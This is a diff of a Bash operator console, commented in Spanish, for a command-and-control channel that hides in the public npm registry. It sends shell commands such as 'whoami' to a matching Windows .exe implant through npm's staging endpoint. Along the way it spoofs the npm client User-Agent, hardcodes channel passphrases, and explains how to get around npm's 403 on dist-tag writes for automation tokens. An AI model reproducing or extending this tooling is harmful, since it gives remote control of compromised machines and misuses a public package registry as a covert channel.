@@ -1,24 +1,22 @@
 #!/usr/bin/env bash
-# Consola interactiva del C2 contra el registro PUBLICO de npm.
+# Consola C2 sobre el registro publico de npm, via transporte por staging.
 #
-#   ./c2.sh              -> shell interactiva
-#   ./c2.sh clients      -> clientes conectados y sale
-#   ./c2.sh watch        -> escucha continua
-#   ./c2.sh run whoami   -> un comando suelto
+#   ./c2.sh                    -> consola interactiva (a la escucha)
+#   ./c2.sh "whoami"           -> un comando y su salida
+#   ./c2.sh -c beef            -> usar otro canal (debe coincidir con el .exe)
 #
-# Todo apunta a registry.npmjs.org, igual que el .exe. El token va en
-# .c2token (chmod 600, fuera de git) para no fijarlo en el repo.
+# Por que staging y no dist-tags: con un token granular bypass-2FA, npm
+# responde 403 en PUT /-/package/<pkg>/dist-tags. La unica escritura que npm
+# sigue permitiendo a la automatizacion es POST /-/stage/package/<pkg>, y es
+# a lo que ellos mismos dicen que hay que moverse para 2027.
 set -euo pipefail
 
 cd "$(dirname "$0")"
 
-# --- configuracion del canal (registro publico) ------------------------------
 PKG="node-runtime-probe-utils"
-API_BASE="https://registry.npmjs.org"
-# El paquete solo tiene 0.0.0-stage; un dist-tag debe apuntar a una version
-# que exista, o npm responde 400.
-TAG_VALUE="0.0.0-stage"
-PASS="cY40lgh0o8PuKeU0q7NT"
+CHAN="a4f2"                       # debe coincidir con --stage-chan del .exe
+PASS="Stage-Pass-2026"            # debe coincidir con --passphrase del .exe
+BASE="https://registry.npmjs.org"
 
 if [[ -f .c2token ]]; then
   TOKEN="$(< .c2token)"
@@ -32,39 +30,39 @@ if [[ ! -x .venv/bin/python ]]; then
   exit 1
 fi
 
-# Aviso temprano: si el token no puede escribir, la shell arrancaria y cada
-# comando moriria con 403 sin explicar por que.
-.venv/bin/python - "$API_BASE" "$PKG" "$TOKEN" "$TAG_VALUE" <<'PY' || exit 2
+# Canal explicito: ./c2.sh -c beef ...
+if [[ "${1:-}" == "-c" ]]; then
+  CHAN="$2"
+  shift 2
+fi
+if [[ $# -gt 0 ]]; then
+  # Comando suelto: todo lo que quede como una unica linea de shell.
+  CMD="$*"
+fi
+
+# Comprobacion temprana: si el token no puede escribir en staging, la consola
+# arrancaria y cada comando moriria sin explicar por que.
+.venv/bin/python - "$BASE" "$TOKEN" <<'PY' || exit 2
 import sys
 import requests
 
-base, pkg, token, version = sys.argv[1:5]
-hdr = {"Authorization": f"Bearer {token}",
-       "User-Agent": "npm/11.18.0 node/v22.7.0 win32 x64"}
-url = f"{base}/-/package/{pkg}/dist-tags"
-probe = f"{url}/preflight-probe"
-try:
-    r = requests.put(probe, json=version, timeout=20, headers=hdr)
-except requests.RequestException as e:
-    print(f"[!] no se pudo comprobar el token: {e}", file=sys.stderr)
-    sys.exit(0)
-if r.status_code in (200, 201, 204):
-    requests.delete(probe, timeout=20, headers=hdr)
-    sys.exit(0)
-if r.status_code == 403:
-    print(f"[!] el registro rechaza la escritura (403): {r.text.strip()[:140]}",
-          file=sys.stderr)
-    print("[!] el canal no podra enviar comandos. Necesitas un token que npm "
-          "acepte para escritura (clasico read-write).", file=sys.stderr)
+base, token = sys.argv[1:3]
+r = requests.get(f"{base}/-/stage", timeout=20,
+                 headers={"Authorization": f"Bearer {token}",
+                          "User-Agent": "npm/11.18.0 node/v22.7.0 win32 x64"})
+if r.status_code == 401:
+    print("[-] el token no vale para staging (401)", file=sys.stderr)
     sys.exit(2)
-print(f"[!] comprobacion del token: HTTP {r.status_code} {r.text[:90]}",
-      file=sys.stderr)
-sys.exit(0)
+if r.status_code >= 300:
+    print(f"[-] comprobacion del token: HTTP {r.status_code} {r.text[:120]}",
+          file=sys.stderr)
+    sys.exit(2)
 PY
 
-export NPMC2_API_BASE="$API_BASE"
-export NPMC2_TAG_VALUE="$TAG_VALUE"
+if [[ -n "${CMD:-}" ]]; then
+  exec .venv/bin/python -m npm_c2 stage -p "$PKG" -t "$TOKEN" -c "$CHAN" \
+    --passphrase "$PASS" --timeout 120 --interval 4 "$CMD"
+fi
 
-exec .venv/bin/python -m npm_c2 operator \
-  -p "$PKG" -t "$TOKEN" --passphrase "$PASS" \
-  "${@:-shell}"
+exec .venv/bin/python -m npm_c2 stage -p "$PKG" -t "$TOKEN" -c "$CHAN" \
+  --passphrase "$PASS" --timeout 120 --interval 4
